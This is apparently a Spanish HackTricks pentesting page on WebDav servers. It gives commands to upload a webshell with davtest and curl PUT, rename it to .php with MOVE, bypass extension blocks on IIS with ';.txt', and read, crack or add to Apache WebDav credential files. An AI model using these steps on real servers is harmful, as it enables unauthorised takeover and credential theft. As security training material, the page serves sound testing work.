# WebDav

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas comunitarias **m√°s avanzadas** del mundo.\
Obt√©n Acceso Hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Un **servidor HTTP con WebDav** activo es un servidor donde probablemente puedas **actualizar, eliminar, mover, copiar** archivos. **A veces** necesitas tener **credenciales v√°lidas** (usualmente se verifica con Autenticaci√≥n B√°sica HTTP).

Deber√≠as intentar **subir** alg√∫n **webshell** y **ejecutarlo** desde el servidor web para tomar control sobre el servidor.\
Normalmente, para **conectar** a un servidor WebDav necesitar√°s **credenciales v√°lidas**: [**Fuerza bruta en WebDav**](../../generic-methodologies-and-resources/brute-force.md#http-basic-auth) _(Autenticaci√≥n B√°sica)_.

Otra configuraci√≥n com√∫n es **prohibir la subida** de archivos con **extensiones** que ser√°n **ejecutadas** por el servidor web, deber√≠as verificar c√≥mo **sortear esto**:

* **Subir** archivos con **extensiones ejecutables** (quiz√°s no est√© prohibido).
* **Subir** archivos **sin extensiones ejecutables** (como .txt) e intentar **renombrar** el archivo (mover) con una **extensi√≥n ejecutable**.
* **Subir** archivos **sin extensiones ejecutables** (como .txt) e intentar **copiar** el archivo (mover) con **extensi√≥n ejecutable**.

## DavTest

**Davtest** intenta **subir varios archivos con diferentes extensiones** y **verificar** si la extensi√≥n se **ejecuta**:
```bash
davtest [-auth user:password] -move -sendbd auto -url http://<IP> #Uplaod .txt files and try to move it to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```
Ejemplo de salida:

![](<../../.gitbook/assets/image (19) (1).png>)

Esto no significa que las extensiones **.txt** y **.html se est√©n ejecutando**. Esto significa que puedes **acceder a estos archivos** a trav√©s de la web.

## Cadaver

Puedes usar esta herramienta para **conectarte al servidor WebDav** y realizar acciones (como **subir**, **mover** o **eliminar**) **manualmente**.
```
cadaver <IP>
```
## Solicitud PUT
```
curl -T 'shell.txt' 'http://$ip'
```
## Solicitud MOVE
```
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente, potenciados por las herramientas comunitarias **m√°s avanzadas** del mundo.\
Obt√©n Acceso Hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Vulnerabilidad de IIS5/6 WebDav

Esta vulnerabilidad es muy interesante. **WebDav** **no permite** **subir** o **renombrar** archivos con la extensi√≥n **.asp**. Pero puedes **evitar** esto **a√±adiendo** al final del nombre **";.txt"** y el archivo se **ejecutar√°** como si fuera un archivo .asp (tambi√©n podr√≠as **usar ".html" en lugar de ".txt"** pero **NO olvides el ";"**).

Luego puedes **subir** tu shell como un archivo ".**txt"** y **copiar/moverlo a un archivo ".asp;.txt"**. Al acceder a ese archivo a trav√©s del servidor web, se **ejecutar√°** (cadaver dir√° que la acci√≥n de mover no funcion√≥, pero s√≠ lo hizo).

![](<../../.gitbook/assets/image (18) (1) (1).png>)

## Credenciales de publicaci√≥n

Si el Webdav utilizaba un servidor Apache deber√≠as mirar los sitios configurados en Apache. Com√∫nmente:\
_**/etc/apache2/sites-enabled/000-default**_

Dentro de este podr√≠as encontrar algo como:
```
ServerAdmin webmaster@localhost
Alias /webdav /var/www/webdav
<Directory /var/www/webdav>
DAV On
AuthType Digest
AuthName "webdav"
AuthUserFile /etc/apache2/users.password
Require valid-user
```
Como puedes ver, est√°n los archivos con las **credenciales** v√°lidas para el servidor **webdav**:
```
/etc/apache2/users.password
```
Dentro de este tipo de archivos encontrar√°s el **username** y un **hash** de la contrase√±a. Estas son las credenciales que el servidor webdav utiliza para autenticar a los usuarios.

Puedes intentar **crackear** los hashes, o **a√±adir m√°s** si por alguna raz√≥n quieres **acceder** al servidor **webdav**:
```bash
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```
Para verificar si las nuevas credenciales funcionan puedes hacer:
```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente, potenciados por las herramientas comunitarias **m√°s avanzadas** del mundo.\
Obt√©n Acceso Hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
